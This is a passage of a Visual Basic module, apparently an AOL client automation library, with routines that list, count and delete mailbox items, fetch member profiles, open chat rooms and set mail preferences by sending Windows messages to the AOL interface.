    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    fMail& = FindWindowEx(MDI&, 0&, "AOL Child", "Incoming/Saved Mail")
    If fMail& = 0& Then Exit Sub
    fList& = FindWindowEx(fMail&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(fList&, LB_GETCOUNT, 0&, 0&)
    MyString$ = String(255, 0)
    For AddMails& = 0 To Count& - 1
        DoEvents
        sLength& = SendMessage(fList&, LB_GETTEXTLEN, AddMails&, 0&)
        MyString$ = String(sLength& + 1, 0)
        Call SendMessageByString(fList&, LB_GETTEXT, AddMails&, MyString$)
        Spot& = InStr(MyString$, Chr(9))
        Spot& = InStr(Spot& + 1, MyString$, Chr(9))
        MyString$ = Right(MyString$, Len(MyString$) - Spot&)
        MyString$ = ReplaceString(MyString$, Chr(0), "")
        TheList.AddItem MyString$
    Next AddMails&
End Sub

Public Function FindMailBox() As Long
    Dim AOL As Long, MDI As Long, child As Long
    Dim TabControl As Long, TabPage As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    TabControl& = FindWindowEx(child&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    If TabControl& <> 0& And TabPage& <> 0& Then
        FindMailBox& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            TabControl& = FindWindowEx(child&, 0&, "_AOL_TabControl", vbNullString)
            TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
            If TabControl& <> 0& And TabPage& <> 0& Then
                FindMailBox& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindMailBox& = 0&
End Function

Public Function MailCountNew() As Long
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, Count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Function
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    MailCountNew& = Count&
End Function

Public Function MailCountSent() As Long
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, Count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Function
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    MailCountSent& = Count&
End Function

Public Function MailCountOld() As Long
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, Count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Function
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    MailCountOld& = Count&
End Function

Public Sub MailDeleteNewByIndex(Index As Long)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, Count As Long, dButton As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Index& > Count& - 1 Or Index& < 0& Then Exit Sub
    Call SendMessage(mTree&, LB_SETCURSEL, Index&, 0&)
    dButton& = FindWindowEx(MailBox&, 0&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    Call SendMessage(dButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(dButton&, WM_LBUTTONUP, 0&, 0&)
End Sub

Public Sub MailDeleteNewDuplicates(VBForm As Form, DisplayStatus As Boolean)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, Count As Long, dButton As Long
    Dim SearchBox As Long, cSender As String, cSubject As String
    Dim SearchFor As Long, sSender As String, sSubject As String
    Dim CurCaption As String
    MailBox& = FindMailBox&
    CurCaption$ = VBForm.Caption
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    dButton& = FindWindowEx(MailBox&, 0&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& = 0& Then Exit Sub
    For SearchFor& = 0& To Count& - 2
        DoEvents
        sSender$ = MailSenderNew(SearchFor&)
        sSubject$ = MailSubjectNew(SearchFor&)
        If sSender$ = "" Then
            VBForm.Caption = CurCaption$
            Exit Sub
        End If
        For SearchBox& = SearchFor& + 1 To Count& - 1
            If DisplayStatus = True Then
                VBForm.Caption = "Now checking #" & SearchFor& & " for match with #" & SearchBox&
            End If
            cSender$ = MailSenderNew(SearchBox&)
            cSubject$ = MailSubjectNew(SearchBox&)
            If cSender$ = sSender$ And cSubject$ = sSubject$ Then
                Call SendMessage(mTree&, LB_SETCURSEL, SearchBox&, 0&)
                DoEvents
                Call SendMessage(dButton&, WM_LBUTTONDOWN, 0&, 0&)
                Call SendMessage(dButton&, WM_LBUTTONUP, 0&, 0&)
                DoEvents
                SearchBox& = SearchBox& - 1
            End If
        Next SearchBox&
    Next SearchFor&
    VBForm.Caption = CurCaption$
End Sub

Public Sub MailDeleteNewBySender(Sender As String)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, Count As Long, dButton As Long
    Dim SearchBox As Long, cSender As String
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    dButton& = FindWindowEx(MailBox&, 0&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& = 0& Then Exit Sub
    For SearchBox& = 0& To Count& - 1
        cSender$ = MailSenderNew(SearchBox&)
        If LCase(cSender$) = LCase(Sender$) Then
            Call SendMessage(mTree&, LB_SETCURSEL, SearchBox&, 0&)
            DoEvents
            Call SendMessage(dButton&, WM_LBUTTONDOWN, 0&, 0&)
            Call SendMessage(dButton&, WM_LBUTTONUP, 0&, 0&)
            DoEvents
            SearchBox& = SearchBox& - 1
        End If
    Next SearchBox&
End Sub

Public Sub MailDeleteNewNotSender(Sender As String)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, Count As Long, dButton As Long
    Dim SearchBox As Long, cSender As String
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    dButton& = FindWindowEx(MailBox&, 0&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& = 0& Then Exit Sub
    For SearchBox& = 0& To Count& - 1
        cSender$ = MailSenderNew(SearchBox&)
        If cSender$ = "" Then Exit Sub
        If LCase(cSender$) <> LCase(Sender$) Then
            Call SendMessage(mTree&, LB_SETCURSEL, SearchBox&, 0&)
            DoEvents
            Call SendMessage(dButton&, WM_LBUTTONDOWN, 0&, 0&)
            Call SendMessage(dButton&, WM_LBUTTONUP, 0&, 0&)
            DoEvents
            SearchBox& = SearchBox& - 1
        End If
    Next SearchBox&
End Sub

Public Function MailSenderFlash(Index As Long) As String
    Dim AOL As Long, MDI As Long, fMail As Long, fList As Long
    Dim fCount As Long, DeleteButton As Long, sLength As Long
    Dim MyString As String, Spot1 As Long, Spot2 As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    fMail& = FindWindowEx(MDI&, 0&, "AOL Child", "Incoming/Saved Mail")
    fList& = FindWindowEx(fMail&, 0&, "_AOL_Tree", vbNullString)
    fCount& = SendMessage(fList&, LB_GETCOUNT, 0&, 0&)
    If fCount& < Index& Then Exit Function
    DeleteButton& = FindWindowEx(fMail&, 0&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    If fCount& = 0 Or Index& > fCount& - 1 Or Index& < 0& Then Exit Function
    sLength& = SendMessage(fList&, LB_GETTEXTLEN, Index&, 0&)
    MyString$ = String(sLength& + 1, 0)
    Call SendMessageByString(fList&, LB_GETTEXT, Index&, MyString$)
    Spot1& = InStr(MyString$, Chr(9))
    Spot2& = InStr(Spot1& + 1, MyString$, Chr(9))
    MyString$ = Mid(MyString$, Spot1& + 1, Spot2& - Spot1& - 1)
    MailSenderFlash$ = MyString$
End Function

Public Function MailSenderNew(Index As Long) As String
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, AddMails As Long, sLength As Long
    Dim Spot1 As Long, Spot2 As Long, MyString As String
    Dim Count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Function
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& = 0 Or Index& > Count& - 1 Or Index& < 0& Then Exit Function
    sLength& = SendMessage(mTree&, LB_GETTEXTLEN, Index&, 0&)
    MyString$ = String(sLength& + 1, 0)
    Call SendMessageByString(mTree&, LB_GETTEXT, Index&, MyString$)
    Spot1& = InStr(MyString$, Chr(9))
    Spot2& = InStr(Spot1& + 1, MyString$, Chr(9))
    MyString$ = Mid(MyString$, Spot1& + 1, Spot2& - Spot1& - 1)
    MailSenderNew$ = MyString$
End Function

Public Function MailSubjectFlash(Index As Long) As String
    Dim AOL As Long, MDI As Long, fMail As Long, fList As Long
    Dim fCount As Long, DeleteButton As Long, sLength As Long
    Dim MyString As String, Spot As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    fMail& = FindWindowEx(MDI&, 0&, "AOL Child", "Incoming/Saved Mail")
    fList& = FindWindowEx(fMail&, 0&, "_AOL_Tree", vbNullString)
    fCount& = SendMessage(fList&, LB_GETCOUNT, 0&, 0&)
    If fCount& < Index& Then Exit Function
    DeleteButton& = FindWindowEx(fMail&, 0&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    If fCount& = 0 Or Index& > fCount& - 1 Or Index& < 0& Then Exit Function
    sLength& = SendMessage(fList&, LB_GETTEXTLEN, Index&, 0&)
    MyString$ = String(sLength& + 1, 0)
    Call SendMessageByString(fList&, LB_GETTEXT, Index&, MyString$)
    Spot& = InStr(MyString$, Chr(9))
    Spot& = InStr(Spot& + 1, MyString$, Chr(9))
    MyString$ = Right(MyString$, Len(MyString$) - Spot&)
    MyString$ = ReplaceString(MyString$, Chr(0), "")
    MailSubjectFlash$ = MyString$
End Function

Public Function MailSubjectNew(Index As Long) As String
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, AddMails As Long, sLength As Long
    Dim Spot As Long, MyString As String, Count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Function
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& = 0 Or Index& > Count& - 1 Or Index& < 0& Then Exit Function
    sLength& = SendMessage(mTree&, LB_GETTEXTLEN, Index&, 0&)
    MyString$ = String(sLength& + 1, 0)
    Call SendMessageByString(mTree&, LB_GETTEXT, Index&, MyString$)
    Spot& = InStr(MyString$, Chr(9))
    Spot& = InStr(Spot& + 1, MyString$, Chr(9))
    MyString$ = Right(MyString$, Len(MyString$) - Spot&)
    MyString$ = ReplaceString(MyString$, Chr(0), "")
    MailSubjectNew$ = MyString$
End Function

Public Sub MailToListNew(TheList As ListBox)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, AddMails As Long, sLength As Long
    Dim Spot As Long, MyString As String, Count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& = 0 Then Exit Sub
    For AddMails& = 0 To Count& - 1
        DoEvents
        sLength& = SendMessage(mTree&, LB_GETTEXTLEN, AddMails&, 0&)
        MyString$ = String(sLength& + 1, 0)
        Call SendMessageByString(mTree&, LB_GETTEXT, AddMails&, MyString$)
        Spot& = InStr(MyString$, Chr(9))
        Spot& = InStr(Spot& + 1, MyString$, Chr(9))
        MyString$ = Right(MyString$, Len(MyString$) - Spot&)
        TheList.AddItem MyString$
    Next AddMails&
End Sub

Public Sub MailToListOld(TheList As ListBox)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, AddMails As Long, sLength As Long
    Dim Spot As Long, MyString As String, Count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& = 0 Then Exit Sub
    For AddMails& = 0 To Count& - 1
        DoEvents
        sLength& = SendMessage(mTree&, LB_GETTEXTLEN, AddMails&, 0&)
        MyString$ = String(sLength& + 1, 0)
        Call SendMessageByString(mTree&, LB_GETTEXT, AddMails&, MyString$)
        Spot& = InStr(MyString$, Chr(9))
        Spot& = InStr(Spot& + 1, MyString$, Chr(9))
        MyString$ = Right(MyString$, Len(MyString$) - Spot&)
        TheList.AddItem MyString$
    Next AddMails&
End Sub

Public Sub MailToListSent(TheList As ListBox)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, AddMails As Long, sLength As Long
    Dim Spot As Long, MyString As String, Count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& = 0 Then Exit Sub
    For AddMails& = 0 To Count& - 1
        DoEvents
        sLength& = SendMessage(mTree&, LB_GETTEXTLEN, AddMails&, 0&)
        MyString$ = String(sLength& + 1, 0)
        Call SendMessageByString(mTree&, LB_GETTEXT, AddMails&, MyString$)
        Spot& = InStr(MyString$, Chr(9))
        Spot& = InStr(Spot& + 1, MyString$, Chr(9))
        MyString$ = Right(MyString$, Len(MyString$) - Spot&)
        TheList.AddItem MyString$
    Next AddMails&
End Sub
Public Sub MemberRoom(room As String)
    Call Keyword("aol://2719:61-2-" & room$)
End Sub

Public Sub PublicRoom(room As String)
    Call Keyword("aol://2719:21-2-" & room$)
End Sub

Public Sub PrivateRoom(room As String)
    Call Keyword("aol://2719:2-2-" & room$)
End Sub
Public Function ProfileGet(ScreenName As String) As String
    Dim AOL As Long, tool As Long, Toolbar As Long
    Dim ToolIcon As Long, DoThis As Long, sMod As Long
    Dim MDI As Long, pgWindow As Long, pgEdit As Long, pgButton As Long
    Dim pWindow As Long, pTextWindow As Long, pString As String
    Dim NoWindow As Long, OKButton As Long, CurPos As POINTAPI
    Dim WinVis As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
        sMod& = FindWindow("#32768", vbNullString)
        WinVis& = IsWindowVisible(sMod&)
    Loop Until WinVis& = 1
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
    Do
        DoEvents
        pgWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Get a Member's Profile")
        pgEdit& = FindWindowEx(pgWindow&, 0&, "_AOL_Edit", vbNullString)
        pgButton& = FindWindowEx(pgWindow&, 0&, "_AOL_Icon", vbNullString)
    Loop Until pgWindow& <> 0& And pgEdit& <> 0& And pgButton& <> 0&
    Call SendMessageByString(pgEdit&, WM_SETTEXT, 0&, ScreenName$)
    Call SendMessage(pgButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(pgButton&, WM_LBUTTONUP, 0&, 0&)
    DoEvents
    Do
        DoEvents
        pWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Member Profile")
        pTextWindow& = FindWindowEx(pWindow&, 0&, "_AOL_View", vbNullString)
        pString$ = GetText(pTextWindow&)
        NoWindow& = FindWindow("#32770", "America Online")
    Loop Until pWindow& <> 0& And pTextWindow& <> 0& Or NoWindow& <> 0&
    DoEvents
    If NoWindow& <> 0& Then
        OKButton& = FindWindowEx(NoWindow&, 0&, "Button", "OK")
        Call SendMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
        Call SendMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
        Call PostMessage(pgWindow&, WM_CLOSE, 0&, 0&)
        ProfileGet$ = "< No Profile >"
    Else
        Call PostMessage(pWindow&, WM_CLOSE, 0&, 0&)
        Call PostMessage(pgWindow&, WM_CLOSE, 0&, 0&)
        ProfileGet$ = pString$
    End If
End Function
Public Sub RunMenu(TopMenu As Long, SubMenu As Long)
    Dim AOL As Long, aMenu As Long, sMenu As Long, mnID As Long
    Dim mVal As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    aMenu& = GetMenu(AOL&)
    sMenu& = GetSubMenu(aMenu&, TopMenu&)
    mnID& = GetMenuItemID(sMenu&, SubMenu&)
    Call SendMessageLong(AOL&, WM_COMMAND, mnID&, 0&)
End Sub

Public Sub RunMenuByString(SearchString As String)
    Dim AOL As Long, aMenu As Long, mCount As Long
    Dim LookFor As Long, sMenu As Long, sCount As Long
    Dim LookSub As Long, sID As Long, sString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    aMenu& = GetMenu(AOL&)
    mCount& = GetMenuItemCount(aMenu&)
    For LookFor& = 0& To mCount& - 1
        sMenu& = GetSubMenu(aMenu&, LookFor&)
        sCount& = GetMenuItemCount(sMenu&)
        For LookSub& = 0 To sCount& - 1
            sID& = GetMenuItemID(sMenu&, LookSub&)
            sString$ = String$(100, " ")
            Call GetMenuString(sMenu&, sID&, sString$, 100&, 1&)
            If InStr(LCase(sString$), LCase(SearchString$)) Then
                Call SendMessageLong(AOL&, WM_COMMAND, sID&, 0&)
                Exit Sub
            End If
        Next LookSub&
    Next LookFor&
End Sub
Public Sub SetMailPrefs()
    Dim AOL As Long, tool As Long, Toolbar As Long
    Dim ToolIcon As Long, DoThis As Long, sMod As Long
    Dim MDI As Long, mPrefs As Long, mButton As Long
    Dim gStatic As Long, mStatic As Long, fStatic As Long
    Dim maStatic As Long, dMod As Long, ConfirmCheck As Long
    Dim CloseCheck As Long, SpellCheck As Long, OKButton As Long
    Dim CurPos As POINTAPI, WinVis As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
        sMod& = FindWindow("#32768", vbNullString)
        WinVis& = IsWindowVisible(sMod&)
    Loop Until WinVis& = 1
    For DoThis& = 1 To 3
        Call PostMessage(sMod&, WM_KEYDOWN, VK_DOWN, 0&)
        Call PostMessage(sMod&, WM_KEYUP, VK_DOWN, 0&)
    Next DoThis&
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
    Do
        DoEvents
        mPrefs& = FindWindowEx(MDI&, 0&, "AOL Child", "Preferences")
        gStatic& = FindWindowEx(mPrefs&, 0&, "_AOL_Static", "General")
        mStatic& = FindWindowEx(mPrefs&, 0&, "_AOL_Static", "Mail")
        fStatic& = FindWindowEx(mPrefs&, 0&, "_AOL_Static", "Font")
        maStatic& = FindWindowEx(mPrefs&, 0&, "_AOL_Static", "Marketing")
    Loop Until mPrefs& <> 0& And gStatic& <> 0& And mStatic& <> 0& And fStatic& <> 0& And maStatic& <> 0&
    mButton& = FindWindowEx(mPrefs&, 0&, "_AOL_Icon", vbNullString)
    mButton& = FindWindowEx(mPrefs&, mButton&, "_AOL_Icon", vbNullString)
    mButton& = FindWindowEx(mPrefs&, mButton&, "_AOL_Icon", vbNullString)
    Do
        DoEvents
        Call SendMessage(mButton&, WM_LBUTTONDOWN, 0&, 0&)
        Call SendMessage(mButton&, WM_LBUTTONUP, 0&, 0&)
        dMod& = FindWindow("_AOL_Modal", "Mail Preferences")
        Pause 0.6
    Loop Until dMod& <> 0&
    ConfirmCheck& = FindWindowEx(dMod&, 0&, "_AOL_Checkbox", vbNullString)
    CloseCheck& = FindWindowEx(dMod&, ConfirmCheck&, "_AOL_Checkbox", vbNullString)
    SpellCheck& = FindWindowEx(dMod&, CloseCheck&, "_AOL_Checkbox", vbNullString)
    SpellCheck& = FindWindowEx(dMod&, SpellCheck&, "_AOL_Checkbox", vbNullString)
    SpellCheck& = FindWindowEx(dMod&, SpellCheck&, "_AOL_Checkbox", vbNullString)
    SpellCheck& = FindWindowEx(dMod&, SpellCheck&, "_AOL_Checkbox", vbNullString)
    OKButton& = FindWindowEx(dMod&, 0&, "_AOL_icon", vbNullString)
    Call SendMessage(ConfirmCheck&, BM_SETCHECK, False, vbNullString)
    Call SendMessage(CloseCheck&, BM_SETCHECK, True, vbNullString)
    Call SendMessage(SpellCheck&, BM_SETCHECK, False, vbNullString)
    Call SendMessage(OKButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(OKButton&, WM_LBUTTONUP, 0&, 0&)
    DoEvents
    Call PostMessage(mPrefs&, WM_CLOSE, 0&, 0&)
End Sub

Public Sub WaitForOKOrRoom(room As String)
    Dim RoomTitle As String, FullWindow As Long, FullButton As Long
    room$ = LCase(ReplaceString(room$, " ", ""))
    Do
        DoEvents
        RoomTitle$ = GetCaption(FindRoom&)
        RoomTitle$ = LCase(ReplaceString(room$, " ", ""))
        FullWindow& = FindWindow("#32770", "America Online")
